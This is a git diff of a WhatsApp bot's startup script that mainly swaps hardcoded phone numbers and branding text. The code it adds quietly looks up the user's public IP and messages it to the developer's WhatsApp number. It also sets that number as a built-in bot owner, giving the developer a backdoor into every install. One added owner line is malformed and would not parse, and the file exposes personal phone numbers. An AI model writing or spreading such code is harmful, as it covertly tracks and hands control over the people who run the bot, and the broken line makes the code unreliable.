@@ -43,7 +43,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("919633687665@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Anees ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919633687665?text=Hi bro"}}})
+       denz.sendMessage("918590634460@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Anees ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919633687665?text=Hi bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
@@ -69,8 +69,8 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["919633687665@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = "919633687665@s.whatsapp.net"
+        ownerNumber =918590634460@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        dtod = "918590634460@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
         denz.on('group-participants-update', async (anu) => {
@@ -133,7 +133,7 @@ denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
             mentionedJid: [num]},
         caption: 'Tes',
             quoted: fkontakk})
-            //sendButLocation(mdata.id, `${masuk}`, `${uwu}ꪶ 𝑲𝑹𝑰𝒁⇥𝑺𝑬𝑹ꫂ⁩右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'HALLO'},type:1}], {contextInfo: { mentionedJid: [num]}})
+            //sendButLocation(mdata.id, `${masuk}`, `${uwu}⁩ꪶ 𝑻𝑶𝑴⇥𝑺𝑬𝑹ꫂ⁩右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'HALLO'},type:1}], {contextInfo: { mentionedJid: [num]}})
 			} else if (anu.action == 'remove') {
 			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
         	if(!welkom.includes(mdata.id)) return
@@ -163,7 +163,7 @@ denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
             mentionedJid: [num]},
         caption: 'Tes',
             quoted: fkontakk})
-            //sendButLocation(mdata.id, `${keluar}`, `${uwu}ꪶ 𝑲𝑹𝑰𝒁⇥𝑺𝑬𝑹ꫂ⁩右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'BYEE'},type:1}], {contextInfo: { mentionedJid: [num]}})
+            //sendButLocation(mdata.id, `${keluar}`, `${uwu}ꪶ 𝑻𝑶𝑴⇥𝑺𝑬𝑹ꫂ⁩右${uwu}`, {jpegThumbnail:buff}, [{buttonId:`Zmenu`,buttonText:{displayText:'BYEE'},type:1}], {contextInfo: { mentionedJid: [num]}})
 			} else if (anu.action == 'promote') {
 fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=91735637894:919633687665\nitem1.X-ABLabel:𝙸𝚗𝚍𝚒𝚊\nEND:VCARD` }}}
 num = anu.participants[0]
@@ -239,7 +239,7 @@ denz.sendMessage(m.key.remoteJid, `▷\`\`\`𝙰𝙽𝚃𝙸 𝙳𝙴𝙻𝙴�
 
 ➬ \`\`\`𝙽𝙰𝙼𝙴 : @${m.participant.split("@")[0]}\`\`\`
 ➬ \`\`\`𝚃𝚈𝙿𝙴 : ${c3type}\`\`\`
-➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 - 𝙱𝙾𝚃 𝙱𝚈 - ꪶ 𝑲𝑹𝑰𝒁⇥𝑺𝑬𝑹ꫂ⁩\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
+➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 - 𝙱𝙾𝚃 𝙱𝚈 -ꪶ 𝑻𝑶𝑴⇥𝑺𝑬𝑹ꫂ⁩\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
 }
 })
 }
